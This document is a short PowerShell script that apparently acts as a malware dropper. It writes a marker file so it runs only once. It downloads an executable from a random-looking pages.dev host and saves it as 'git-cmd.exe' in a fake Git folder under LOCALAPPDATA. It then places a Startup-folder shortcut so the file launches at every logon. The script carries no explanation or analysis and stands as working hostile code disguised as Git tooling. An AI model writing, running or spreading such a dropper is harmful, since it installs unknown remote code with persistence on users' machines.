if (Test-Path "$env:USERPROFILE\github.msg") {
    exit
} else {
    New-Item -Path "$env:USERPROFILE\github.msg" -ItemType "file"
}

$destination = "$env:LOCALAPPDATA\Git\git-cmd.exe"
$binFolder = "$env:LOCALAPPDATA\Git\bin"

$folder = Split-Path -Path $destination
if (-not (Test-Path -Path $folder)) {
    New-Item -ItemType Directory -Path $folder
}

Invoke-WebRequest -Uri "https://ipnqtxhsbvcmurjolgkfadzwey.pages.dev/Git/git-cmd.exe" -OutFile $destination

if (-not (Test-Path -Path $binFolder)) {
    New-Item -ItemType Directory -Path $binFolder
}

$WshShell = New-Object -ComObject WScript.Shell
$StartupFolder = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
$Shortcut = $WshShell.CreateShortcut("$StartupFolder\GitCmd.lnk")
$Shortcut.TargetPath = $destination
$Shortcut.Save()
